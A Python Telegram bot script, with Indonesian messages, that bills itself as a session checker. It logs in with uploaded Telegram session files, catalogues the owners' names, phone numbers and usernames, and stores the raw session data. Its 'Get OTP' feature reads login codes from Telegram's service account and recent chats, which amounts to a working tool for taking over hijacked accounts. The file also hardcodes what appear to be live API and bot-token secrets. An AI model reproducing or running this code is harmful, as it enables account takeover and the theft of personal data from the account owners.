#
import os
import asyncio
import time
import json
import zipfile
import shutil
import random
import signal
import traceback
from datetime import datetime
from telethon.sync import TelegramClient
from telethon import events, Button
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError
from telethon.errors.rpcerrorlist import AuthKeyError, PhoneNumberBannedError

# Bot configuration
API_ID = 25649945
API_HASH = "d91f3e307f5ee75e57136421f2c3adc6"
BOT_TOKEN = "7354445605:AAEyRju_l_T1y-tgHd4NgD-bVJseb3tGr_U"
ADMIN_ID = 5988451717

# Dictionary to track session files received from users
user_sessions = {}

# Dictionary to store active sessions
active_sessions = {}

# File to store active sessions
SESSIONS_FILE = "active_sessions.json"

# OTP Sender
OTP_SENDER = "+42777"

# Temporary directory for zip extraction
TEMP_DIR = "temp_zip_extraction"

# Pending tasks set to properly manage asyncio tasks
pending_tasks = set()

# Create bot with proper connection parameters
bot = None

# Initialize the bot safely
async def init_bot():
    global bot
    try:
        # Add slightly longer timeout for reliability
        bot = TelegramClient('bot', API_ID, API_HASH, connection_retries=5, retry_delay=1)
        await bot.start(bot_token=BOT_TOKEN)
        print("Bot berhasil diinisialisasi")
        return True
    except Exception as e:
        print(f"Error saat inisialisasi bot: {e}")
        return False

# Helper function to create and track asyncio tasks
def create_task(coro):
    task = asyncio.create_task(coro)
    pending_tasks.add(task)
    task.add_done_callback(pending_tasks.discard)
    return task

# Load saved sessions from file
def load_sessions():
    global active_sessions
    try:
        if os.path.exists(SESSIONS_FILE):
            with open(SESSIONS_FILE, 'r') as f:
                active_sessions = json.load(f)
            print(f"Berhasil memuat {sum(len(sessions) for sessions in active_sessions.values())} session dari file")
        else:
            print("File session tidak ditemukan, membuat baru")
            active_sessions = {}
    except Exception as e:
        print(f"Error loading sessions: {e}")
        active_sessions = {}

# Save sessions to file
def save_sessions():
    try:
        with open(SESSIONS_FILE, 'w') as f:
            json.dump(active_sessions, f)
        print(f"Berhasil menyimpan {sum(len(sessions) for sessions in active_sessions.values())} session ke file")
    except Exception as e:
        print(f"Error saving sessions: {e}")

# Create temp directories if needed
def ensure_temp_dirs():
    try:
        if not os.path.exists(TEMP_DIR):
            os.makedirs(TEMP_DIR)
            print(f"Dibuat direktori sementara: {TEMP_DIR}")
    except Exception as e:
        print(f"Error creating temp directory: {e}")

# Clean up temporary files
def cleanup_temp_files():
    try:
        if os.path.exists(TEMP_DIR):
            shutil.rmtree(TEMP_DIR)
            print(f"Dibersihkan direktori sementara: {TEMP_DIR}")
        
        # Clean up any temp files in the current directory
        for filename in os.listdir('.'):
            if filename.startswith('temp_') or filename.endswith('.session'):
                try:
                    os.remove(filename)
                except:
                    pass
    except Exception as e:
        print(f"Error cleaning up temp files: {e}")

@events.register(events.NewMessage(pattern='/start'))
async def start(event):
    """Send a message when the command /start is issued."""
    await event.respond('Selamat datang di Session Checker Bot! Kirim file session Telegram atau file ZIP untuk dicheck.')

@events.register(events.NewMessage(pattern='/kelola'))
async def kelola(event):
    """Handle /kelola command to manage active sessions."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.respond("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Convert user_id to string for dictionary key
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and active_sessions[user_id_str]:
        # Create pagination for sessions
        await show_session_list(user_id, 0)
    else:
        await event.respond("Tidak ada session aktif yang tersimpan. Silakan check session terlebih dahulu.")

async def show_session_list(user_id, page=0):
    """Show paginated list of active sessions."""
    try:
        user_id_str = str(user_id)
        
        if user_id_str not in active_sessions or not active_sessions[user_id_str]:
            await bot.send_message(user_id, "Tidak ada session aktif yang tersimpan.")
            return
        
        # Get sessions for the user
        sessions = active_sessions[user_id_str]
        
        # Calculate pagination
        sessions_per_page = 5
        total_pages = (len(sessions) + sessions_per_page - 1) // sessions_per_page
        
        if page < 0:
            page = 0
        if page >= total_pages:
            page = total_pages - 1
        
        start_idx = page * sessions_per_page
        end_idx = min(start_idx + sessions_per_page, len(sessions))
        
        # Create message with session list
        message = "🔐 **DAFTAR SESSION AKTIF**\n\n"
        
        for i in range(start_idx, end_idx):
            session = sessions[i]
            message += f"{i+1}. **{session.get('first_name', 'Tidak diketahui')}** (@{session.get('username', 'tidak ada') or 'tidak ada'}) - `{session.get('phone', 'Tidak diketahui')}`\n"
        
        message += f"\nHalaman {page+1}/{total_pages}"
        
        # Create buttons for pagination and actions
        buttons = []
        
        # Add session buttons
        session_buttons = []
        for i in range(start_idx, end_idx):
            session = sessions[i]
            name = session.get('first_name', 'Unknown')
            phone = session.get('phone', 'No Phone')
            session_buttons.append([Button.inline(f"🔹 {name} ({phone})", f"session_{i}")])
        
        # Add navigation buttons
        nav_buttons = []
        if page > 0:
            nav_buttons.append(Button.inline("⬅️ Sebelumnya", f"page_{page-1}"))
        if page < total_pages - 1:
            nav_buttons.append(Button.inline("Selanjutnya ➡️", f"page_{page+1}"))
        
        buttons = session_buttons
        if nav_buttons:
            buttons.append(nav_buttons)
        
        await bot.send_message(user_id, message, buttons=buttons)
    except Exception as e:
        print(f"Error in show_session_list: {e}")
        await bot.send_message(user_id, f"Terjadi error saat menampilkan daftar session: {str(e)}")

@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"page_")))
async def handle_page_callback(event):
    """Handle pagination callbacks."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Get requested page
        page = int(event.data.decode().split("_")[1])
        
        # Show session list for that page
        await event.delete()
        await show_session_list(user_id, page)
    except Exception as e:
        print(f"Error in handle_page_callback: {e}")
        await event.answer(f"Terjadi error: {str(e)}")

@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"session_")))
async def handle_session_callback(event):
    """Handle session selection."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Get selected session index
        session_idx = int(event.data.decode().split("_")[1])
        user_id_str = str(user_id)
        
        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
            session = active_sessions[user_id_str][session_idx]
            
            # Create action buttons for the session
            buttons = [
                [
                    Button.inline("📲 Get OTP", f"otp_{session_idx}"),
                    Button.inline("🗑️ Hapus", f"delete_{session_idx}")
                ],
                [Button.inline("⬅️ Kembali", b"back_to_list")]
            ]
            
            # Create session info message with safer gets
            message = (
                f"✅ **DETAIL SESSION**\n\n"
                f"📱 **Nomor:** `{session.get('phone', 'Tidak diketahui')}`\n"
                f"👤 **Nama Depan:** `{session.get('first_name', 'Tidak diketahui')}`\n"
                f"👤 **Nama Belakang:** `{session.get('last_name', 'Tidak ada')}`\n"
                f"🔖 **Username:** `{session.get('username', 'Tidak ada')}`\n"
                f"🆔 **User ID:** `{session.get('user_id', 'Tidak diketahui')}`\n"
                f"📅 **Tanggal Pembuatan:** `{session.get('creation_date', 'Tidak diketahui')}`\n"
                f"🔐 **Premium:** `{session.get('is_premium', 'Tidak diketahui')}`\n"
                f"🔄 **2FA Aktif:** `{session.get('has_2fa', 'Tidak diketahui')}`\n"
            )
            
            await event.edit(message, buttons=buttons)
        else:
            await event.answer("Session tidak ditemukan.")
    except Exception as e:
        print(f"Error in handle_session_callback: {e}")
        await event.answer(f"Terjadi error: {str(e)}")

@events.register(events.CallbackQuery(data=b"back_to_list"))
async def back_to_list(event):
    """Go back to the session list."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        await event.delete()
        await show_session_list(user_id, 0)
    except Exception as e:
        print(f"Error in back_to_list: {e}")
        await event.answer(f"Terjadi error: {str(e)}")

@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"otp_")))
async def get_otp(event):
    """Get OTP for the selected session."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Get selected session index
        session_idx = int(event.data.decode().split("_")[1])
        user_id_str = str(user_id)
        
        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
            session = active_sessions[user_id_str][session_idx]
            
            # Create a status message
            status_msg = await event.respond("⏳ Sedang mencari OTP terbaru...")
            
            # Try to get OTP
            otp_result = await get_latest_otp(session)
            
            if otp_result['success']:
                # Hanya tampilkan kode OTP saja, tanpa pesan lengkap
                await status_msg.edit(
                    f"✅ **OTP DITEMUKAN**\n\n"
                    f"📱 **Untuk:** `{session.get('phone', 'Tidak diketahui')}`\n"
                    f"🔢 **Kode OTP:** `{otp_result['otp']}`\n"
                    f"⏰ **Waktu:** `{otp_result['time']}`",
                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
                )
            else:
                await status_msg.edit(
                    f"❌ **OTP TIDAK DITEMUKAN**\n\n"
                    f"Pesan: {otp_result['error']}",
                    buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
                )
        else:
            await event.answer("Session tidak ditemukan.")
    except Exception as e:
        print(f"Error in get_otp: {e}")
        try:
            await event.answer(f"Terjadi error saat mencari OTP")
            await event.respond(f"Error: {str(e)}", buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")])
        except:
            pass

@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"delete_")))
async def confirm_delete_session(event):
    """Confirm deletion of a session."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Get selected session index
        session_idx = int(event.data.decode().split("_")[1])
        user_id_str = str(user_id)
        
        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
            session = active_sessions[user_id_str][session_idx]
            
            # Create confirmation buttons
            buttons = [
                [
                    Button.inline("✅ Ya, Hapus", f"confirm_delete_{session_idx}"),
                    Button.inline("❌ Batal", f"session_{session_idx}")
                ]
            ]
            
            await event.edit(
                f"⚠️ **KONFIRMASI HAPUS SESSION**\n\n"
                f"Apakah Anda yakin ingin menghapus session ini?\n\n"
                f"📱 **Nomor:** `{session.get('phone', 'Tidak diketahui')}`\n"
                f"👤 **Nama:** `{session.get('first_name', 'Tidak diketahui')}`\n"
                f"🔖 **Username:** `@{session.get('username', 'tidak ada') or 'tidak ada'}`\n",
                buttons=buttons
            )
        else:
            await event.answer("Session tidak ditemukan.")
    except Exception as e:
        print(f"Error in confirm_delete_session: {e}")
        await event.answer(f"Terjadi error: {str(e)}")

@events.register(events.CallbackQuery(data=lambda x: x.startswith(b"confirm_delete_")))
async def delete_session(event):
    """Delete a session after confirmation."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Get selected session index
        session_idx = int(event.data.decode().split("_")[2])
        user_id_str = str(user_id)
        
        if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
            # Get session info before removing
            session = active_sessions[user_id_str][session_idx]
            
            # Remove the session
            del active_sessions[user_id_str][session_idx]
            
            # Save updated sessions
            save_sessions()
            
            await event.edit(
                f"✅ **SESSION TELAH DIHAPUS**\n\n"
                f"Session untuk `{session.get('phone', 'Tidak diketahui')}` (`{session.get('first_name', 'Tidak diketahui')}`) telah dihapus.",
                buttons=[Button.inline("⬅️ Kembali ke Daftar", b"back_to_list")]
            )
        else:
            await event.answer("Session tidak ditemukan.")
    except Exception as e:
        print(f"Error in delete_session: {e}")
        await event.answer(f"Terjadi error: {str(e)}")

async def get_latest_otp(session):
    """Get the latest OTP message from the session."""
    client = None
    session_path = f"temp_session_{session.get('user_id', 'unknown')}_{int(time.time())}.session"
    
    result = {'success': False, 'error': 'Error tidak diketahui'}
    
    try:
        # Try to create a client with the saved session data
        if not session.get('session_data'):
            return {'success': False, 'error': "Data session tidak tersedia"}
            
        # Write session data to file - ensure it has .session extension
        with open(session_path, 'wb') as f:
            f.write(bytes.fromhex(session['session_data']))
        
        # Add a small delay to avoid connection errors
        await asyncio.sleep(1)
        
        # Connect to Telegram with better error handling and more retries
        client = TelegramClient(
            session_path.replace('.session', ''),  # TelegramClient adds .session itself
            API_ID, 
            API_HASH, 
            connection_retries=5,
            retry_delay=2
        )
        
        # Use a longer timeout for connection
        try:
            await asyncio.wait_for(client.connect(), timeout=20)
        except asyncio.TimeoutError:
            return {'success': False, 'error': "Koneksi timeout"}
        
        # Wait a bit after connection before checking authorization
        await asyncio.sleep(2)
        
        # Ensure we're connected and authorized
        if not await client.is_user_authorized():
            print(f"Session {session.get('phone')} tidak terotorisasi saat mencoba get OTP")
            # Try once more with forced reconnection
            await client.disconnect()
            await asyncio.sleep(2)
            await client.connect()
            await asyncio.sleep(1)
            
            if not await client.is_user_authorized():
                return {'success': False, 'error': "Session tidak terotorisasi setelah percobaan ulang"}
            
        # Add a small delay before message retrieval
        await asyncio.sleep(2)
        
        try:
            # Try both OTP sender and Telegram service account with better handling
            sender_entities = [OTP_SENDER, '+42777', '777000', 'telegram']  # Add more variations of OTP sender
            
            for sender in sender_entities:
                try:
                    print(f"Mencoba mendapatkan pesan dari {sender}")
                    # Get messages from this sender
                    messages = []
                    try:
                        async for message in client.iter_messages(sender, limit=15):
                            if message and message.message:
                                messages.append(message)
                    except Exception as iter_error:
                        print(f"Error iterating messages from {sender}: {iter_error}")
                        continue
                    
                    # Look for OTP in messages
                    if messages:
                        print(f"Ditemukan {len(messages)} pesan dari {sender}")
                        for msg in messages:
                            if not msg.message:
                                continue
                                
                            # Extract OTP (usually a 5-6 digit number)
                            import re
                            otp_match = re.search(r'\b\d{4,6}\b', msg.message)
                                
                            if otp_match:
                                otp_code = otp_match.group(0)
                                return {
                                    'success': True,
                                    'otp': otp_code,
                                    'time': msg.date.strftime('%Y-%m-%d %H:%M:%S')
                                }
                    else:
                        print(f"Tidak ada pesan dari {sender}")
                except Exception as msg_error:
                    print(f"Error retrieving messages from {sender}: {msg_error}")
                    continue
            
            # If we get here, no OTP was found, try getting recent messages from any source
            try:
                print("Mencari pesan OTP dari pesan terbaru")
                recent_messages = []
                async for dialog in client.iter_dialogs(limit=5):
                    try:
                        async for message in client.iter_messages(dialog.entity, limit=5):
                            if message and message.message:
                                recent_messages.append((dialog.name, message))
                    except:
                        continue
                
                # Check all recent messages for OTP patterns
                for dialog_name, msg in recent_messages:
                    if not msg.message:
                        continue
                        
                    # Look for OTP patterns in message
                    import re
                    otp_match = re.search(r'\b\d{4,6}\b', msg.message)
                    
                    # Also look for typical OTP message patterns
                    otp_keywords = ['code', 'otp', 'verification', 'login', 'kode', 'verifikasi']
                    has_otp_keywords = any(keyword in msg.message.lower() for keyword in otp_keywords)
                    
                    if otp_match and has_otp_keywords:
                        otp_code = otp_match.group(0)
                        return {
                            'success': True,
                            'otp': otp_code,
                            'time': msg.date.strftime('%Y-%m-%d %H:%M:%S'),
                            'source': dialog_name
                        }
            except Exception as recent_error:
                print(f"Error checking recent messages: {recent_error}")
            
            # If we get here, no OTP was found
            return {'success': False, 'error': "Tidak menemukan pesan OTP dari server Telegram"}
            
        except Exception as e:
            print(f"Error in message retrieval: {e}")
            return {'success': False, 'error': f"Error saat mencari pesan: {str(e)}"}
    
    except FloodWaitError as e:
        print(f"FloodWaitError: {e}")
        return {'success': False, 'error': f"Telegram meminta menunggu {e.seconds} detik"}
    except PhoneNumberBannedError:
        return {'success': False, 'error': "Nomor telepon dalam session telah dibanned"}
    except AuthKeyError:
        return {'success': False, 'error': "Session key tidak valid"}
    except Exception as e:
        print(f"Error in get_latest_otp: {e}")
        traceback.print_exc()
        return {'success': False, 'error': str(e)}
    finally:
        # Ensure client is disconnected
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        # Clean up session file
        try:
            await asyncio.sleep(1)  # Small delay before cleanup
            if os.path.exists(session_path):
                os.remove(session_path)
            if os.path.exists(session_path.replace('.session', '') + '.session'):
                os.remove(session_path.replace('.session', '') + '.session')
        except Exception as e:
            print(f"Error cleaning up session files: {e}")

@events.register(events.NewMessage(func=lambda e: e.is_private))
async def handle_message(event):
    """Handle incoming messages in private chats."""
    try:
        user_id = event.sender_id
        
        # Only allow admin to use the bot
        if user_id != ADMIN_ID:
            await event.respond("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
            return
        
        # Check if the message contains a document (file)
        if event.document:
            # Get file name and mime type
            file_name = event.file.name if hasattr(event.file, 'name') else f"unknown_file_{int(time.time())}"
            mime_type = event.file.mime_type if hasattr(event.file, 'mime_type') else ""
            
            # Check if it's a zip file
            if file_name.lower().endswith('.zip') or mime_type == 'application/zip':
                # Download the zip file
                download_path = f"temp_zip_{int(time.time())}.zip"
                await event.respond(f"⏬ Mengunduh file ZIP: `{file_name}`...")
                
                # Download with a small delay to prevent errors
                await asyncio.sleep(0.5)
                await event.download_media(file=download_path)
                
                # Process the zip file
                create_task(process_zip_file(download_path, user_id, event.id))
            else:
                # Download the file (regular session file)
                download_path = f"temp_{int(time.time())}_{file_name}"
                
                # Send a processing message
                processing_msg = await event.respond(f"⏬ Mengunduh file session: `{file_name}`...")
                
                # Download with a small delay to prevent errors
                await asyncio.sleep(0.5)
                await event.download_media(file=download_path)
                
                # Check the session immediately
                await process_single_session(download_path, user_id, event.id, processing_msg)
    except Exception as e:
        print(f"Error in handle_message: {e}")
        await event.respond(f"❌ Terjadi error saat memproses file: {str(e)}")

async def process_single_session(file_path, user_id, message_id, processing_msg=None):
    """Process a single session file."""
    try:
        if processing_msg:
            await processing_msg.edit("⏳ Memproses file session...")
        else:
            processing_msg = await bot.send_message(user_id, "⏳ Memproses file session...", reply_to=message_id)
        
        # Add a small delay to prevent errors
        await asyncio.sleep(1)
        
        # Check the session file
        result = await check_session_file(file_path)
        
        # Format and send results
        if result['valid']:
            # Format creation date if available
            creation_date = "Tidak diketahui"
            if 'creation_date' in result and result['creation_date']:
                creation_date = result['creation_date'].strftime('%Y-%m-%d %H:%M:%S')
            
            # Store valid session
            user_id_str = str(user_id)
            if user_id_str not in active_sessions:
                active_sessions[user_id_str] = []
            
            # Add to active sessions if not already exists
            session_exists = False
            for existing_session in active_sessions[user_id_str]:
                if existing_session.get('user_id') == result.get('user_id'):
                    session_exists = True
                    break
            
            if not session_exists:
                # Read session data
                session_data = None
                try:
                    with open(result['session_path'], 'rb') as f:
                        session_data = f.read().hex()
                except Exception as e:
                    print(f"Error reading session data: {e}")
                
                # Add to active sessions
                active_sessions[user_id_str].append({
                    'user_id': result.get('user_id'),
                    'first_name': result.get('first_name', 'Tidak diketahui'),
                    'last_name': result.get('last_name', 'Tidak ada'),
                    'username': result.get('username'),
                    'phone': result.get('phone', 'Tidak diketahui'),
                    'creation_date': creation_date,
                    'is_premium': result.get('is_premium', 'Tidak diketahui'),
                    'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
                    'session_data': session_data
                })
                
                # Save sessions
                save_sessions()
            
            message = (
                f"✅ **SESSION VALID**\n\n"
                f"📱 **Nomor:** `{result.get('phone', 'Tidak diketahui')}`\n"
                f"👤 **Nama Depan:** `{result.get('first_name', 'Tidak diketahui')}`\n"
                f"👤 **Nama Belakang:** `{result.get('last_name', 'Tidak ada')}`\n"
                f"🔖 **Username:** `{result.get('username', 'Tidak ada')}`\n"
                f"🆔 **User ID:** `{result.get('user_id', 'Tidak diketahui')}`\n"
                f"📅 **Tanggal Pembuatan:** `{creation_date}`\n"
                f"🔐 **Premium:** `{result.get('is_premium', 'Tidak diketahui')}`\n"
                f"🔄 **2FA Aktif:** `{result.get('has_2fa', 'Tidak diketahui')}`\n"
            )
        else:
            message = f"❌ **SESSION TIDAK VALID**\n\nError: {result.get('error', 'Error tidak diketahui')}"
        
        # Edit the processing message with the results
        await processing_msg.edit(message)
        
        # Clean up the session file
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error removing file {file_path}: {e}")
    except Exception as e:
        print(f"Error in process_single_session: {e}")
        if processing_msg:
            await processing_msg.edit(f"❌ Terjadi error saat memproses session: {str(e)}")

async def process_zip_file(file_path, user_id, message_id):
    """Extract and process session files from a zip archive."""
    processing_msg = None
    extract_dir = os.path.join(TEMP_DIR, f"extract_{int(time.time())}")
    
    try:
        processing_msg = await bot.send_message(
            user_id,
            "⏳ Memproses file ZIP...",
            reply_to=message_id
        )
        
        # Create temp directory if it doesn't exist
        ensure_temp_dirs()
        
        # Create a unique subfolder for this extraction
        os.makedirs(extract_dir, exist_ok=True)
        
        sessions_found = 0
        sessions_valid = 0
        
        # Extract the zip file
        try:
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            
            # Update processing message
            await processing_msg.edit("⏳ ZIP diekstrak, mencari file session...")
        except zipfile.BadZipFile:
            await processing_msg.edit("❌ File tidak valid atau bukan file ZIP.")
            return
        
        # Look for session files in the expected structure: sessions/users/
        sessions_dir = os.path.join(extract_dir, "sessions", "users")
        
        # Check if the expected directory exists
        if os.path.exists(sessions_dir) and os.path.isdir(sessions_dir):
            # Get all files in the sessions/users directory
            session_files = []
            for root, _, files in os.walk(sessions_dir):
                for file in files:
                    # Skip obvious non-session files
                    if file.endswith(('.txt', '.md', '.json', '.zip')):
                        continue
                    
                    session_files.append(os.path.join(root, file))
            
            total_files = len(session_files)
            
            if total_files > 0:
                await processing_msg.edit(f"⏳ Ditemukan {total_files} file session potensial, memproses...")
                
                # Process each session file
                count = 0
                for session_file in session_files:
                    count += 1
                    if count % 3 == 0:  # Update progress every 3 files
                        await processing_msg.edit(f"⏳ Memproses file session {count}/{total_files}...")
                    
                    sessions_found += 1
                    
                    # Add a random delay between 1-3 seconds to prevent rate limiting
                    await asyncio.sleep(1 + random.random() * 2)
                    
                    result = await check_session_file(session_file)
                    
                    if result['valid']:
                        sessions_valid += 1
                        
                        # Format creation date if available
                        creation_date = "Tidak diketahui"
                        if 'creation_date' in result and result['creation_date']:
                            creation_date = result['creation_date'].strftime('%Y-%m-%d %H:%M:%S')
                        
                        # Store valid session
                        user_id_str = str(user_id)
                        if user_id_str not in active_sessions:
                            active_sessions[user_id_str] = []
                        
                        # Add to active sessions if not already exists
                        session_exists = False
                        for existing_session in active_sessions[user_id_str]:
                            if existing_session.get('user_id') == result.get('user_id'):
                                session_exists = True
                                break
                        
                        if not session_exists:
                            # Read session data
                            session_data = None
                            try:
                                with open(result['session_path'], 'rb') as f:
                                    session_data = f.read().hex()
                            except Exception as e:
                                print(f"Error reading session data: {e}")
                            
                            # Add to active sessions
                            active_sessions[user_id_str].append({
                                'user_id': result.get('user_id'),
                                'first_name': result.get('first_name', 'Tidak diketahui'),
                                'last_name': result.get('last_name', 'Tidak ada'),
                                'username': result.get('username'),
                                'phone': result.get('phone', 'Tidak diketahui'),
                                'creation_date': creation_date,
                                'is_premium': result.get('is_premium', 'Tidak diketahui'),
                                'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
                                'session_data': session_data
                            })
                
                # Save sessions
                save_sessions()
            else:
                await processing_msg.edit("❌ Tidak ditemukan file session di dalam struktur sessions/users/ pada file ZIP.")
                return
        else:
            await processing_msg.edit("❌ Struktur folder sessions/users/ tidak ditemukan di dalam file ZIP.")
            return
            
    except Exception as e:
        print(f"Error in process_zip_file: {e}")
        if processing_msg:
            await processing_msg.edit(f"❌ Error saat memproses file ZIP: {str(e)}")
        return
    finally:
        # Clean up
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
            
            if os.path.exists(extract_dir):
                shutil.rmtree(extract_dir)
        except Exception as e:
            print(f"Error cleaning up files: {e}")
    
    # Final report
    if sessions_found > 0:
        if processing_msg:
            await processing_msg.edit(
                f"✅ **PROSES ZIP SELESAI**\n\n"
                f"📊 **Hasil:**\n"
                f"- Session ditemukan: {sessions_found}\n"
                f"- Session valid: {sessions_valid}\n\n"
                f"Gunakan /kelola untuk melihat dan mengelola session yang valid."
            )
    else:
        if processing_msg:
            await processing_msg.edit("❌ Tidak ada file session yang ditemukan dalam file ZIP.")

async def check_session_file(file_path):
    """Check a session file and extract information from it."""
    result = {'valid': False}
    client = None
    
    try:
        # Get a unique session path
        session_name = f"check_{int(time.time())}_{os.path.basename(file_path)}"
        session_path = session_name.replace('temp_', '')
        
        # Copy the file to the new path
        try:
            shutil.copy2(file_path, session_path)
        except Exception as e:
            print(f"Error copying session file: {e}")
            # Try to use the original path as fallback
            session_path = file_path
        
        # Save the session path
        result['session_path'] = session_path
        
        # Try to create a client with the session
        client = TelegramClient(session_path, API_ID, API_HASH, connection_retries=2)
        
        # Connect with timeout
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
        except asyncio.TimeoutError:
            result['error'] = "Koneksi timeout"
            return result
        
        # Add a small delay after connection
        await asyncio.sleep(0.5)
        
        # Check authorization
        if await client.is_user_authorized():
            result['valid'] = True
            
            # Add a small delay before getting user info
            await asyncio.sleep(0.5)
            
            try:
                # Get the current user info
                me = await client.get_me()
                
                # Basic user info
                result['user_id'] = me.id
                result['first_name'] = me.first_name
                result['last_name'] = me.last_name
                result['username'] = me.username
                result['phone'] = me.phone
                result['is_premium'] = "Ya" if getattr(me, 'premium', False) else "Tidak"
                
                # Check if 2FA is enabled
                result['has_2fa'] = "Tidak dapat ditentukan"
                
                # Try to get creation date (estimation based on user ID)
                try:
                    # This is a rough estimation, not 100% accurate
                    timestamp = ((me.id >> 32) - 1420070400)
                    if timestamp > 0:
                        result['creation_date'] = datetime.fromtimestamp(timestamp)
                except Exception as e:
                    print(f"Error getting creation date: {e}")
                    result['creation_date'] = None
            except Exception as e:
                print(f"Error getting user info: {e}")
                # Session is still valid but we couldn't get user info
                result['error_details'] = str(e)
        else:
            result['error'] = "Session tidak terotorisasi"
    except SessionPasswordNeededError:
        result['error'] = "Password 2FA diperlukan"
        result['has_2fa'] = "Ya"
    except PhoneNumberInvalidError:
        result['error'] = "Nomor telepon dalam session tidak valid"
    except PhoneNumberBannedError:
        result['error'] = "Nomor telepon dalam session telah dibanned"
    except AuthKeyError:
        result['error'] = "Session key tidak valid"
    except FloodWaitError as e:
        result['error'] = f"Rate limited oleh Telegram. Tunggu {e.seconds} detik."
    except Exception as e:
        print(f"Error in check_session_file: {e}")
        traceback.print_exc()
        result['error'] = str(e)
    finally:
        # Disconnect client
        if client:
            try:
                await client.disconnect()
            except:
                pass
            
            # Add a small delay before cleanup
            await asyncio.sleep(0.5)
    
    return result

async def shutdown(signal, loop):
    """Clean shutdown of the bot."""
    print(f"Received exit signal {signal.name}...")
    
    # Cancel all running tasks
    tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
    
    if tasks:
        print(f"Cancelling {len(tasks)} tasks...")
        for task in tasks:
            task.cancel()
        
        # Wait for tasks to finish with timeout
        await asyncio.gather(*tasks, return_exceptions=True)
    
    # Clean up temporary files
    cleanup_temp_files()
    
    # Stop the bot
    if bot:
        await bot.disconnect()
    
    loop.stop()

async def main():
    # Initialize bot
    if not await init_bot():
        print("Failed to initialize bot. Exiting.")
        return
    
    # Ensure directories exist
    ensure_temp_dirs()
    
    # Load saved sessions
    load_sessions()
    
    # Register event handlers
    bot.add_event_handler(start)
    bot.add_event_handler(kelola)
    bot.add_event_handler(handle_message)
    bot.add_event_handler(handle_page_callback)
    bot.add_event_handler(handle_session_callback)
    bot.add_event_handler(back_to_list)
    bot.add_event_handler(get_otp)
    bot.add_event_handler(confirm_delete_session)
    bot.add_event_handler(delete_session)
    
    print("Bot telah dijalankan...")
    
    # Keep the bot running
    await bot.run_until_disconnected()

if __name__ == "__main__":
    # Setup signal handlers
    loop = asyncio.get_event_loop()
    signals = (signal.SIGINT, signal.SIGTERM)
    for s in signals:
        try:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(shutdown(s, loop))
            )
        except NotImplementedError:
            # Windows doesn't support adding signal handlers to the event loop
            pass
    
    # Run the bot
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Fatal error: {e}")
        traceback.print_exc()
    finally:
        # Clean up and close the loop
        cleanup_temp_files()
        loop.close()
